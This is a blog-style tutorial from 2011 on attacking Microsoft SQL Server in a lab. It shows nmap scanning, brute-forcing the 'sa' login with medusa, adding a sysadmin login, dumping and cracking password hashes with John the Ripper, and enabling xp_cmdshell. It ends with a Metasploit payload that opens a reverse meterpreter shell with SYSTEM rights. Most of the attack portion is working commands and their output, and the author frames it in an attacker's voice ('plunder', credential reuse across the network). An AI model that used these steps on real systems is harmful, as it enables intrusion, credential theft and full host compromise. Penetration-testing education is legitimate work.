---
title: "pen test and hack microsoft sql server (mssql)"
date: "2011-12-22"
layout: post
---

All the information I'm about to go over is nothing new, I'm just trying to organize all my notes on pen testing mssql. Hopefully my notes will help others. All the commands and instructions are Linux based so keep that in mind.


The first thing you'll need to do is discover IP addresses that have mssql running. So you'll accomplish this by running some type of scan. The scanner of choice is always [nmap](http://nmap.org/) but there are some things you'll need to consider when scanning for mssql. The default port for mssql is 1433 but just like with any service it can listen any port. So for starters it's definitely a good idea to scan an IP range looking for port 1433.

Step 1 scan for port 1433, this can be done using the following nmap command.

```bash
root@bt:~# nmap -p 1433 192.168.134.130-140
``` 

This will only scan for port 1433 on host 130-140, your IP range will vary. My output is below.
```bash
Starting Nmap 5.59BETA1 ( http://nmap.org ) at 2011-12-07 23:38 EST
Nmap scan report for 192.168.134.131
Host is up (0.00012s latency)
PORT     STATE  SERVICE
1433/tcp closed ms-sql-s

Nmap scan report for 192.168.134.132
Host is up (0.00032s latency)
PORT     STATE SERVICE
1433/tcp open  ms-sql-s MAC Address: 00:0C:29:4C:37:8E (VMware)
Nmap done: 11 IP addresses (2 hosts up) scanned in 0.86 seconds
```

In this case the 131 host port is closed but the 132 host has port 1433 open. So great success we've found a box running mssql. Hold your horses because this is simply the beginning. If you're scanning is focused then this type of scan is fine, meaning I'm not scanning thousands of hosts I'm only focused on a handful of hosts. If I'm only concerned about scanning a handful of hosts then my next step would be to determine two things.

1. Version of the database
2. Are there any other additional listening ports for this database

To determine the version of the database we can once again turn to nmap.

```bash
root@bt:~# nmap -p 1433 -A 192.168.134.132
```

The "-A" option will try and determine as much information as it can about the service on port 1433 in this case. The "-A" option will also try and determine the underlying OS running as well. Below is the output from this scan.

```bash
Starting Nmap 5.59BETA1 ( http://nmap.org ) at 2011-12-08 09:19 EST
Nmap scan report for 192.168.134.132
Host is up (0.0044s latency).
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2005 9.00.1399.00; RTM
MAC Address: 00:0C:29:4C:37:8E (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 2003
OS details: Microsoft Windows Server 2003 SP1 or SP2
Network Distance: 1 hop

Host script results:
| ms-sql-info:
|   Windows server name: WIN2003
|   [192.168.134.132\MSSQLSERVER]
|     Instance name: MSSQLSERVER
|     Version: Microsoft SQL Server 2005 RTM
|       Version number: 9.00.1399.00
|       Product: Microsoft SQL Server 2005
|       Service pack level: RTM
|       Post-SP patches applied: No
|     TCP port: 1433
|     Named pipe: \\192.168.134.132\pipe\sql\query
|_    Clustered: No
```

So you'll notice in the output nmap is reporting the version of mssql to be SQL Server 2005 which is correct in this case. Knowing the version is very important because different versions of SQL Server provide different security features and also have different vulnerabilities. There are other ways of determining the version of sql server without authenticating but to me nmap is the best solution.

Next let's talk about looking for other ports that mssql may be listening on. For multiple reasons, like load balancing, mssql can listen on multiple ports. When pen testing mssql we want to know what those ports are so we can bang against them. Depending on the configuration you can authenticate to every listening mssql port. One thing to keep in mind is that you can authenticate to mssql using your normal windows / network / active directory credentials or you can authenticate using an account that was setup on the mssql server. This is basically known as windows authentication or sql authentication. When setting up the sql server and ports the database administrator will have to configure on how this authentication takes place. The easier target is using sql credentials as those are typically configured with a weaker password policy. Now that I've discussed some of the issues let's get cracking. So to determine additional ports that a database may be running on we'll once again turn to nmap. This time I told mssql to also listen on port 1444 and 1433.

[![](images/multiplePortsMssql.png "multiplePortsMssql")](http://travisaltman.com/wp-content/multiplePortsMssql.png)

So now go ahead and run the same nmap command as before.

```bash
root@bt:~# nmap -A -p 1433 192.168.134.132
Starting Nmap 5.59BETA1 ( http://nmap.org ) at 2011-12-12 13:54 EST
Nmap scan report for 192.168.134.132
Host is up (0.0036s latency).
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2005 9.00.1399.00; RTM
MAC Address: 00:0C:29:4C:37:8E (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 2003
OS details: Microsoft Windows Server 2003 SP1 or SP2
Network Distance: 1 hop
Service Info: OS: Windows
Host script results:
| ms-sql-info:
|   Windows server name: WIN2003
|   [192.168.134.132\MSSQLSERVER]
|     Instance name: MSSQLSERVER
|     Version: Microsoft SQL Server 2005 RTM
|       Version number: 9.00.1399.00
|       Product: Microsoft SQL Server 2005
|       Service pack level: RTM
|       Post-SP patches applied: No
|     TCP port: 1444
|     Named pipe: \\192.168.134.132\pipe\sql\query
|     Clustered: No
|   [192.168.134.132:1433]
|     Version: Microsoft SQL Server 2005 RTM
|       Version number: 9.00.1399.00
|       Product: Microsoft SQL Server 2005
|       Service pack level: RTM
|       Post-SP patches applied: No
|_    TCP port: 1433
```

So we see that nmap reports back ports 1444 and 1433 are listening. You may be wondering how nmap knew that port 1444 was open. MSSQL runs a service called the "browser service" which runs on port 1434 and uses UDP instead of TCP. If this browser service wasn't running nmap wouldn't be able to pull this information. Basically nmap queries port 1434 asking for any other instances that are running on different ports. It does this using the [mssql nmap script](http://nmap.org/nsedoc/scripts/ms-sql-info.html). There are a couple of other tools [here](http://packetstormsecurity.org/files/24465/sqlping.c) and [here](http://www.metasploit.com/modules/auxiliary/scanner/mssql/mssql_ping) that do the same thing but I stick with nmap since it's already baked in. So the browser service and additional ports is a very important to keep in mind when pen testing mssql.

Now we have more information about our target which hopefully means we'll find a weak spot that we can exploit. Once you know the version it's always recommended to search [CVE (common vulnerabilities and weaknesses)](http://cve.mitre.org/cve/cve) and it may also not be a bad idea to search inside the [metasploit](http://metasploit.com/) tool as well. There aren't a whole lot of remote code execution vulnerabilities for anything SQL Server 2005 and beyond but it's always worth checking just to make sure. So if they aren't running an old unpatched version of mssql then that means you'll need credentials to authenticate to the sql server. This means we'll need to try and brute force the credentials. The main tool I like to use to perform [brute force attacks is medusa](http://www.foofus.net/~jmk/medusa/medusa.html), another good alternative is [hydra](http://thc.org/thc-hydra/). I have had different degrees of luck with both tools so it may be useful to run both tools although my default is medusa. I will only cover how to use medusa, below is the typical command line options that you feed into medusa.

```bash
medusa -h 192.168.134.132 -U dictionary.txt -P dictionary.txt -O medusaOutput.txt -M mssql
```

The -h is the host, the -U is the username list, -P is the password list, -O is the output file, -M is the module you want to run against in this case it's mssql. Below is the output of this command.

```bash
Medusa v2.0 \[http://www.foofus.net\] (C) JoMo-Kun / Foofus Networks

ACCOUNT CHECK: [mssql] Host: 192.168.134.132 (1 of 1, 0 complete) User: admin (1 of 3, 0 complete) Password: admin (1 of 3 complete)
ACCOUNT CHECK: [mssql] Host: 192.168.134.132 (1 of 1, 0 complete) User: admin (1 of 3, 0 complete) Password: password (2 of 3 complete)
ACCOUNT CHECK: [mssql] Host: 192.168.134.132 (1 of 1, 0 complete) User: admin (1 of 3, 0 complete) Password: sa (3 of 3 complete)
ACCOUNT CHECK: [mssql] Host: 192.168.134.132 (1 of 1, 0 complete) User: password (2 of 3, 1 complete) Password: admin (1 of 3 complete)
ACCOUNT CHECK: [mssql] Host: 192.168.134.132 (1 of 1, 0 complete) User: password (2 of 3, 1 complete) Password: password (2 of 3 complete)
ACCOUNT CHECK: [mssql] Host: 192.168.134.132 (1 of 1, 0 complete) User: password (2 of 3, 1 complete) Password: sa (3 of 3 complete)
ACCOUNT CHECK: [mssql] Host: 192.168.134.132 (1 of 1, 0 complete) User: sa (3 of 3, 2 complete) Password: admin (1 of 3 complete)
ACCOUNT CHECK: [mssql] Host: 192.168.134.132 (1 of 1, 0 complete) User: sa (3 of 3, 2 complete) Password: password (2 of 3 complete)
ACCOUNT FOUND: [mssql] Host: 192.168.134.132 User: sa Password: password [SUCCESS]
```

Your output file resemble the following.

```bash
root@bt:~# cat medusaOutput.txt
# Medusa v.2.0 (2011-12-12 22:59:43)
# medusa -h 192.168.134.132 -U dictionary.txt -P dictionary.txt -O medusaOutput -M mssql
ACCOUNT FOUND: [mssql] Host: 192.168.134.132 User: sa Password: password [SUCCESS]
# Medusa has finished (2011-12-12 22:59:46).
```

The file output is much easier to parse and we can see in the next to last line that it was successful in finding credentials of username = sa and password = password. By default medusa will run against the standard port which is 1433 in this case, if you want medusa to run against a non standard port you'll need to include the "-n" option.

```bash
root@bt:~# medusa -h 192.168.134.132 -U dictionary.txt -P dictionary.txt -O medusaOutput -M mssql -n 1444
Medusa v2.0 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks

ACCOUNT CHECK: [mssql] Host: 192.168.134.132 (1 of 1, 0 complete) User: admin (1 of 3, 0 complete) Password: admin (1 of 3 complete)
ACCOUNT CHECK: [mssql] Host: 192.168.134.132 (1 of 1, 0 complete) User: admin (1 of 3, 0 complete) Password: password (2 of 3 complete)
ACCOUNT CHECK: [mssql] Host: 192.168.134.132 (1 of 1, 0 complete) User: admin (1 of 3, 0 complete) Password: sa (3 of 3 complete)
ACCOUNT CHECK: [mssql] Host: 192.168.134.132 (1 of 1, 0 complete) User: password (2 of 3, 1 complete) Password: admin (1 of 3 complete)
ACCOUNT CHECK: [mssql] Host: 192.168.134.132 (1 of 1, 0 complete) User: password (2 of 3, 1 complete) Password: password (2 of 3 complete)
ACCOUNT CHECK: [mssql] Host: 192.168.134.132 (1 of 1, 0 complete) User: password (2 of 3, 1 complete) Password: sa (3 of 3 complete)
ACCOUNT CHECK: [mssql] Host: 192.168.134.132 (1 of 1, 0 complete) User: sa (3 of 3, 2 complete) Password: admin (1 of 3 complete)
ACCOUNT CHECK: [mssql] Host: 192.168.134.132 (1 of 1, 0 complete) User: sa (3 of 3, 2 complete) Password: password (2 of 3 complete)
ACCOUNT FOUND: [mssql] Host: 192.168.134.132 User: sa Password: password [SUCCESS]
```

So you see that medusa was able to authenticate to port 1444 with the same username and password. This may not always be the case. With mssql you can configure different ports with different credentials so it's always best to run a brute force tool like medusa on each individual port and see if you get any hits. Medusa and hydra can take a while to run in my case I had a very small dictionary seen below.

```bash
root@bt:~# cat dictionary.txt
admin
password
sa
```

Large dictionaries can take some time to run so keep that in mind when you're brute forcing using these kinds of tools. So we got lucky and we credentials for a mssql database, that's awesome but it's just another step in the process. Going forward we have a couple of options. As a true attacker you would consider the following options.

1. Plunder the database for information
2. Use your credentials to gain further access (e.g. administrator on the underlying operating system)
3. Start serving up malware for potential victims

I'm not going to touch on the third option but I will discuss the first and second option. So for the first option once we have credentials we can start to query the database. In this scenario I've got the best kind of credentials you can ask for on a mssql database which is the "sa" user. This will not always be the case but it's the example I've chosen to follow. One good thing to run with credentials is [metasploit's enum tool](http://www.metasploit.com/modules/auxiliary/admin/mssql/mssql_enum). This module basically gives you an overview of the sql server configuration and some note worthy security related configurations. Below is how to use mssql\_enum.

\[cce\]
msf > use auxiliary/admin/mssql/mssql_enum
msf  auxiliary(mssql_enum) > info

Name: Microsoft SQL Server Configuration Enumerator
Module: auxiliary/admin/mssql/mssql_enum
Version: 14288
License: Metasploit Framework License (BSD)
Rank: Normal

Provided by:
Carlos Perez

Basic options:
Name                 Current Setting  Required  Description
----                 ---------------  --------  -----------
PASSWORD                              no        The password for the specified username
RHOST                                 yes       The target address
RPORT                1433             yes       The target port
USERNAME             sa               no        The username to authenticate as
USE_WINDOWS_AUTHENT  false            yes       Use windows authentification

Description:
This module will perform a series of configuration audits and
security checks against a Microsoft SQL Server database. For this
module to work, valid administrative user credentials must be
supplied.

msf  auxiliary(mssql_enum) > set rhost 192.168.134.132
rhost => 192.168.134.132
msf  auxiliary(mssql_enum) > set password password
password => password
msf  auxiliary(mssql_enum) > run
\[/cce\]

Below is the output of running the tool.

\[cce\]
[*] Running MS SQL Server Enumeration...
[*] Version:
[*] Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86)
[*]     Oct 14 2005 00:33:37
[*]     Copyright (c) 1988-2005 Microsoft Corporation
[*]     Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
[*] Configuration Parameters:
[*]     C2 Audit Mode is Not Enabled
[*]     xp_cmdshell is Not Enabled
[*]     remote access is Enabled
[*]     allow updates is Not Enabled
[*]     Database Mail XPs is Not Enabled
[*]     Ole Automation Procedures are Not Enabled
[*] Databases on the server:
[*]     Database name:master
[*]     Database Files for master:
[*]         C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\master.mdf
[*]         C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\mastlog.ldf
[*]     Database name:tempdb
[*]     Database Files for tempdb:
[*]         C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\tempdb.mdf
[*]         C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\templog.ldf
[*]     Database name:model
[*]     Database Files for model:
[*]         C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\model.mdf
[*]         C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\modellog.ldf
[*]     Database name:msdb
[*]     Database Files for msdb:
[*]         C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\MSDBData.mdf
[*]         C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\MSDBLog.ldf
[*] System Logins on this Server:
[*]     sa
[*]     ##MS_SQLResourceSigningCertificate##
[*]     ##MS_SQLReplicationSigningCertificate##
[*]     ##MS_SQLAuthenticatorCertificate##
[*]     ##MS_AgentSigningCertificate##
[*]     BUILTIN\Administrators
[*]     NT AUTHORITY\SYSTEM
[*]     WIN2003\SQLServer2005MSSQLUser$WIN2003$MSSQLSERVER
[*]     WIN2003\SQLServer2005SQLAgentUser$WIN2003$MSSQLSERVER
[*]     WIN2003\SQLServer2005MSFTEUser$WIN2003$MSSQLSERVER
[*] Disabled Accounts:
[*]     No Disabled Logins Found
[*] No Accounts Policy is set for:
[*]     All System Accounts have the Windows Account Policy Applied to them.
[*] Password Expiration is not checked for:
[*]     sa
[*] System Admin Logins on this Server:
[*]     sa
[*]     BUILTIN\Administrators
[*]     NT AUTHORITY\SYSTEM
[*]     WIN2003\SQLServer2005MSSQLUser$WIN2003$MSSQLSERVER
[*]     WIN2003\SQLServer2005SQLAgentUser$WIN2003$MSSQLSERVER
[*] Windows Logins on this Server:
[*]     NT AUTHORITY\SYSTEM
[*] Windows Groups that can logins on this Server:
[*]     BUILTIN\Administrators
[*]     WIN2003\SQLServer2005MSSQLUser$WIN2003$MSSQLSERVER
[*]     WIN2003\SQLServer2005SQLAgentUser$WIN2003$MSSQLSERVER
[*]     WIN2003\SQLServer2005MSFTEUser$WIN2003$MSSQLSERVER
[*] Accounts with Username and Password being the same:
[*]     No Account with its password being the same as its username was found.
[*] Accounts with empty password:
[*]     No Accounts with empty passwords where found.
[*] Stored Procedures with Public Execute Permission found:
[*]     sp_replsetsyncstatus
[*]     sp_replcounters
[*]     sp_replsendtoqueue
[*]     sp_resyncexecutesql
[*]     sp_prepexecrpc
[*]     sp_repltrans
[*]     sp_xml_preparedocument
[*]     xp_qv
[*]     xp_getnetname
[*]     sp_releaseschemalock
[*]     sp_refreshview
[*]     sp_replcmds
[*]     sp_unprepare
[*]     sp_resyncprepare
[*]     sp_createorphan
[*]     xp_dirtree
[*]     sp_replwritetovarbin
[*]     sp_replsetoriginator
[*]     sp_xml_removedocument
[*]     sp_repldone
[*]     sp_reset_connection
[*]     xp_fileexist
[*]     xp_fixeddrives
[*]     sp_getschemalock
[*]     sp_prepexec
[*]     xp_revokelogin
[*]     sp_resyncuniquetable
[*]     sp_replflush
[*]     sp_resyncexecute
[*]     xp_grantlogin
[*]     sp_droporphans
[*]     xp_regread
[*]     sp_getbindtoken
[*]     sp_replincrementlsn
[*] Instances found on this server:
[*]     MSSQLSERVER
[*] Default Server Instance SQL Server Service is running under the privilege of:
[*]     LocalSystem
[*] Auxiliary module execution completed
\[/cce\]

I'm not going to go through this entire output but all of it is relevant to security configuration. Things to note are permissions which the service runs as, password settings (e.g. account lock outs, password expiration), and stored procedures that are available. You can read more about [stored procedures](http://msdn.microsoft.com/en-us/library/aa174792(v=sql.80).aspx?ppud=4) but the main thing to know is that they extend the functionality of mssql by giving easy access to common tasks such as granting access to a database. The one stored procedure every pen tester wants access to is the mighty [xp\_cmdshell](http://msdn.microsoft.com/en-us/library/aa260689(v=sql.80).aspx) which allows you to execute operating system commands with a database call. So information that you can obtain, xp\_cmdshell enabled or disabled, about the database will help you to further assess or pen test the setup. Going forward it's best to have some sort of mssql client so that you can make sql queries to the database. I'm a fan of keeping things lightweight so I prefer command line clients and not GUI (graphical user interface) clients. So for accessing mssql from Linux I recommend [sqsh](http://www.sqsh.org/) and as for accessing from a windows PC I like the Microsoft SQL Server Command Line Utilities which will first require an install of the Microsoft SQL Server Native Client, both [microsoft tools can be found here](http://www.microsoft.com/download/en/details.aspx?id=16978). Now we'll get items of interest such as stored procedures but first let's use one of the clients mentioned to access and run some sql queries. The syntax for both clients is very similar but first let's look at the microsoft client. You'll first need to change to the proper folder where the sql client was installed.

\[cce\]
Microsoft Windows XP \[Version 5.1.2600\] (C) Copyright 1985-2001 Microsoft Corp.
C:\\WINDOWS\\system32>cd "c:\\Program Files\\Microsoft SQL Server\\90\\Tools\\binn"
C:\\Program Files\\Microsoft SQL Server\\90\\Tools\\binn>
\[/cce\]

So to connect to 192.168.134.132 run the following command.

```bash
SQLCMD.exe -S 192.168.134.132 -U sa
```

Below are the basic options for this command

\[cce\]
-S for server name (IP or name)
-U for user name
-P for password (will prompt if not supplied)
\[/cce\]

After you've run the above command you should see the following.

\[cce\]
C:\Program Files\Microsoft SQL Server\90\Tools\binn>SQLCMD.EXE -S 192.168.134.132 -U sa
Password:
1>
\[/cce\]

So the "1>" is the prompt where you will enter your sql commands, let's just run a basic sql query to confirm everything works, we'll query for the version in this case.

\[cce\]\
1> select @@version
2> go

-------------------------------------------------------------------------
-------------------------------------------------------------------------
-------------------------------------------------------------------------
------------------------------------------------------------
Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86)
Oct 14 2005 00:33:37
Copyright (c) 1988-2005 Microsoft Corporation
Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)

(1 rows affected)
1>
\[/cce\]

So after typing your sql query you'll be dropped down to your second prompt "2>" there you will need to type "go" and hit enter for it to run your query. Running the sqsh client you'll get similar results.

\[cce\]
root@bt:~# sqsh -S 192.168.134.132 -U sa
sqsh-2.1 Copyright (C) 1995-2001 Scott C. Gray
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
Password:
1> select @@version
2> go

------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------

Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86)
Oct 14 2005 00:33:37
Copyright (c) 1988-2005 Microsoft Corporation
Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)

(1 row affected)
1>
\[/cce\]

Just type "exit" if you want to leave the client. Another thing to note is the help menu for both commands. Below is the help command for sqsh.

```bash
sqsh --help
```

Help for sqlcmd.exe

```bash
sqlcmd.exe /?
```

One thing that might not be very clear from the help output is how you would connect to a different port. By default both of these clients connect on port 1433, if you want to connect to a different port you'll have to use the following syntax.

```bash
sqsh -S 192.168.134.132:1444 -U sa

sqlcmd.exe -S 192.168.134.132 -U sa
```

So getting the versions of the database proves that our clients are working correctly and we have access, next we'll focus on sql queries that will extract some useful information that a pen tester could leverage.

Determine the current user

\[cce\]
select suser\_sname();
\[/cce\]

Create user "travis" with password "secret"

```bash
exec master..sp\_addlogin travis, secret
```

Or another way

```bash
create login travis with password='secret';
```

Create a table named pwned

```bash
create table pwned (owned int not null default 1337);
```

Determine current database

```bash
SELECT DB\_NAME();
```

List all databases

```bash
SELECT name FROM master..sysdatabases;
```

Determine host name of PC the database is installed on

```bash
SELECT HOST\_NAME();
```

Determine users with sysadmin rights

```bash
select loginname from syslogins where sysadmin = 1
```

Add user travis to the sysadmin role

```bash
exec sp\_addsrvrolemember 'travis', 'sysadmin'
```

Now as an attacker I mentioned the three basic options of plunder database, use credentials for further access, and hosting malware. The commands above are examples of "plundering" the database and these commands merely scratch the surface. Another plundering idea would be to [search all databases for "items of interest"](http://justgeeks.blogspot.com/2006/10/search-ms-sql-server-for-any-text.html). Once you have credentials to the database you have plenty of options for plundering. The second step I mentioned was using your credentials for further access. Two things come to my mind which is cracking sql passwords and gaining access to the underlying OS that hosts the database. An attacker would want to know sql passwords because often those passwords are reused. That reuse includes other databases and possibly other credentials such as active directory credentials. The other piece of gaining access to the underlying OS of the database will allow you to do a number of things such as key logging, searching the file system, [pass the hash technique](http://en.wikipedia.org/wiki/Pass_the_hash), etc. So I'll first discuss how to crack the encrypted passwords inside of a mssql database. Just so we're on the same page a password is not supposed to be stored in [clear text](http://en.wikipedia.org/wiki/Plaintext) in a database is suppose to be stored encrypted as a [cryptographic hash](http://en.wikipedia.org/wiki/Cryptographic_hash_function). Cryptographic hash is a fancy way of saying that the password cannot be easily determined and they encrypted value is commonly referred as a hash, not to be confused with the delicious food. So the next step is to get these hashes and crack'em.

Extract username and password hashes

```bash
select name, password\_hash FROM master.sys.sql\_logins
```

You should see something like the following

\[cce\]
1> select name, password_hash from master.sys.sql_logins
2> go

name

password_hash

-----------------------------------------
-----------------------------------------
-----------------------------------------
-----------------------------------------

sa

01004086ceb6e0bc04fe5027a51df29e1cf0b74dd3c33214d9db

travis

01007c5b54a91367647bb18d6efc4de8e9e3560037e39e9f712e
\[/cce\]

Now you can take that password hash and feed it into a password cracker such as [john the ripper](http://www.openwall.com/john/) but before you do that you'll need to add a zero plus X "0x" to the beginning of the password hash. This needs to be done because john the ripper expects password hashes in certain formats and if you need to know what that format is for various types of hash functions then [pentestmonkey](http://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats) is a good resource for this type of information. So your modified hash with zero plus X in front should look like the following.

```bash
0x01007c5b54a91367647bb18d6efc4de8e9e3560037e39e9f712e
```

Now put that into a text file so we can feed it to john the ripper, in this case I named it mssqlHash.txt. Next all you have to do is use the command "john" along with the file that contains the password hashes as below.

\[cce\]
root@bt:/pentest/passwords/john# john mssqlHash.txt
Loaded 1 password hash (MS-SQL05 [ms-sql05 SSE2])
secret           (?)
guesses: 1  time: 0:00:00:00 100.00% (2) (ETA: Fri Dec 16 01:18:56 2011)  c/s: 400  trying: secret - service
\[/cce\]

Here john the ripper was able to crack this hash and determined the password was "secret". So now that you've cracked some passwords on this database there's a good chance that username and password will work on other databases within the environment you're testing. Seeing how server and database admins like to keep things together that same username and password will probably work on another machine on the same vlan so just start nmap scanning to find those open ports then add the username and password you found into your medusa dictionary then let medusa do it's brute forcing and hopefully you'll find another database you can gain access to.

The last technique I'll discuss is gaining access to the underlying operating system that the database is running on. Having sysadmin credentials on the database is awesome but having admin on the underlying operating system is even better. As I mentioned before the stored procedure xp\_cmdshell is the best way to gain this kind of access but as you can see from the metasploit enum module xp\_cmdshell isn't always at our disposal. The xp\_cmdshell was enabled by default on mssql 2000 but mssql 2005 and beyond by default does not enable this stored procedure. Even so a mssql 2000 database administrator could disable it as well. One way and maybe the easiest way is to use metasploits mssql\_payload module to enable the xp\_cmdshell and give you a meterpreter shell back. Below is the command you'll need to run. You have to set at least the host you're targeting (rhost) and the password of the "sa" account. This module will not work unless the user you're authenticating with has sysadmin credentials, so the account doesn't have to be "sa" but it has to be a user with a sysadmin role.

\[cce\]
msf > use exploit/windows/mssql/mssql_payload
msf  exploit(mssql_payload) > set rhost 192.168.134.132
rhost => 192.168.134.132
msf  exploit(mssql_payload) > set password password
password => password
msf  exploit(mssql_payload) > exploit

[*] Started reverse handler on 192.168.134.135:4444
[*] Command Stager progress -   1.47% done (1499/102246 bytes)
[*] Command Stager progress -   2.93% done (2998/102246 bytes)
snip
.
.
[*] Command Stager progress -  99.59% done (101827/102246 bytes)
[*] Sending stage (752128 bytes) to 192.168.134.132
[*] Command Stager progress - 100.00% done (102246/102246 bytes)
[*] Meterpreter session 1 opened (192.168.134.135:4444 -> 192.168.134.132:1046) at 2011-12-21 22:43:36 -0500

meterpreter >
\[/cce\]

So at this point we have a meterpreter command prompt on the target computer which is better than a regular windows command prompt. From here we can launch a number of attacks. I'm not going to touch on those for that just simply google "post exploitation" to get an idea of what you may want to accomplish next. At this point its a good idea to make sure you're on the right computer and determine the types of credentials we have on our target machine. The following commands will determine that information.

\[cce\]
meterpreter > ipconfig

MS TCP Loopback interface
Hardware MAC: 00:00:00:00:00:00
IP Address  : 127.0.0.1
Netmask     : 255.0.0.0

Intel(R) PRO/1000 MT Network Connection
Hardware MAC: 00:0c:29:4c:37:8e
IP Address  : 192.168.134.132
Netmask     : 255.255.255.0

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
\[/cce\]

So we're on the correct computer and we have "system" credentials which is the highest credentials you can have on a windows platform. Great success. At the heart of this metasploit module is some sql commands that will enable the xp\_cmdshell. If you wanted to manually enable xp\_cmdshell you could enter the sql commands below.

\[cce\]
1> SP_CONFIGURE 'show advanced options', 1
2> go
Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
(return status = 0)
1> reconfigure
2> go
1> SP_CONFIGURE 'xp_cmdshell', 1
2> go
Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
(return status = 0)
1> reconfigure
2> go
1>
\[/cce\]

That's all folks, more could be covered here but this will get you started. Once again I haven't covered anything new here and this documentation is meant to capture some of the common tasks that need to be completed when testing mssql. Hope this helps and happy mssql hunting.
